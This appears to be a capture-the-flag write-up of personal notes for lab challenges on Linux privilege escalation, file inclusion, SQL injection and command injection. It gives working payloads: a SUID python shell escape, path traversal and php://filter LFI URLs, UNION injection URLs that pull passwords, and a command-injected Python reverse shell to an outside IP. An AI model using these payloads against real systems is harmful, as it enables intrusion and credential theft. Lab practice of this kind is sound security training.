# Linux Fundamentals / Privesc challenge

### Flag 1
- ssh in
- `ls`

### Flag 2
- `cd look-in-here`
- `cat flag2.txt`

### Flag 3
- `ls -la`
- `cd also/in/here` 
- `cat .flag3` 

### Flag 4
- `find . -name "flag4.txt" -print 2>/dev/null`
- `cat ./var/backups/.my/secret/backup/folder/is/here/flag4.txt`

### Flag 5
- `sudo -l`
- `sudo -u flag5 /bin/bash`
- `cd home -> flag5 -> cat flag5.txt`

### Flag 6
- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- `(find / -type f -a ( -perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2> /dev/null)`
- `cd /opt/bins`
- `./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`                                                                                                 
- `cd /home -> /flag6 -> cat flag6.txt`                                                                                                                      

### Flag 7                                                                                                                                                         
- `ls -la`                                                                                                                                                   
- `cd .ssh`                                                                                                                                                  
- `ssh -i /home/flag6/.ssh/id_flag7 flag7@127.0.0.1`                                                                                                         


# LOFI challenges
https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers

### Flag 1
- http://10.128.238.88/?page=/var/www/html/../../../flag.txt

### Flag 2
- http://10.128.238.88/?page=php://filter/convert.base64-encode/resource=flag.php

# sqlADmin

### Flag 1
> `http://10.128.240.69/home/post/?id=100%20UNION%20SELECT%20*%20FROM%20User`
> - Error: Table 'sqli.User' doesn't exist

> `http://10.128.240.69/home/post/?id=100%20UNION%20SELECT%20*%20FROM%20users`
> - Error: The used SELECT statements have a different number of columns

> `http://10.128.240.69/home/post/?id=100%20UNION%20SELECT%201,password,2,3,4%20FROM%20users%20WHERE%20id=2`
> - Gives FLAG

# LINUX SHARK

### Flag 2
1. look for products/6
- http://10.128.238.69/items/100%20UNION%20SELECT%20name,bio,1,1,1,1%20FROM%20users
> 100 UNION SELECT name,bio,1,1,1,1 FROM users

### Flag 3 
- /admin
- `; cat /home/website/flag.txt`

### Flag 4
- check server for what it is running (network/ Server response header)
- submit reverse shell:
  - `; export RHOST="10.128.0.9";export RPORT=5555;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
- `cat /etc/passwd`
- `su bill_admin`
- `Password: god`
- `cat flag2.txt`


